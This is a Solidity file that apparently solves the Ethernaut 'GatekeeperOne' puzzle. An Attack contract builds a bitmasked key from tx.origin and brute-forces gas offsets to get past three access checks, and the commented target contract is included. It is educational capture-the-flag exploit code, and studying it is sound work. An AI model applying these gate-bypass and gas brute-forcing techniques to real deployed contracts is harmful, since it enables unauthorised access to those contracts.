// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attack {
    function attack(address _target) external {
        // Gate One
        // This gate is automatically passed because msg.sender = 'Attack' but tx.origin = 'player' address

        // Gate Two
        // gasleft() is a global solidity fxn that returns the amount of gas left after a transaction/ execution of an OPCODE by the EVM
        // total gas = (8191 * k) + i(amount of gas spent before checking gas left)
        // brute force value of i

        // Gate Three
        // Input(_gateKey) = 8 byte(1 byte = 8 bits) string or 16 hex characters

        // requirement 1
        // uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)) --> for this to be equal the first 2 bytes of uint32(uint64(_gateKey)) have to be zeros
        // uint64(_gateKey) => numerical rep of the _gatekey
        // uint32(uint64(_gateKey)) => truncates the first 32bits(first half of the data is cut off(lost) --> reduced to 4 bytes
        // uint16(uint64(_gateKey)) => truncates the 2/3 of the _gateKey(only the last 2 bytes/16 bits remains)

        // requirement 2
        // (uint32(uint64(_gateKey)) != uint64(_gateKey) --> first 4 bytes must not be zeros and should be equal to the first 4 bytes of tx.origin

        // requirement 3
        // (uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)) --> last 2 bytes of tx.origin must equal last two bytes of (uint32(uint64(_gateKey))
        // uint160 = 20 bytes = length of an address on ETH --> numerical rep of an address
        // uint16(uint160(tx.origin)) => truncates to the last 2 bytes of tx.origin

        //Bitmasking --> using bitwise operations like "&" to perform binary operations on data

        bytes8 gateKey = bytes8(
            uint64(uint160(tx.origin)) & 0xFFFFFFFF0000FFFF
        );

        for (uint256 i = 0; i < 300; ++i) {
            uint256 totalGas = i + (8191 * 3);
            (bool result, ) = _target.call{gas: totalGas}(
                abi.encodeWithSignature("enter(bytes8)", gateKey)
            );

            if (result) {
                break;
            }
        }
    }
}

contract GatekeeperOne {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        require(gasleft() % 8191 == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(
            uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)),
            "GatekeeperOne: invalid gateThree part one"
        );
        require(
            uint32(uint64(_gateKey)) != uint64(_gateKey),
            "GatekeeperOne: invalid gateThree part two"
        );
        require(
            uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)),
            "GatekeeperOne: invalid gateThree part three"
        );
        _;
    }

    function enter(
        bytes8 _gateKey
    ) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}
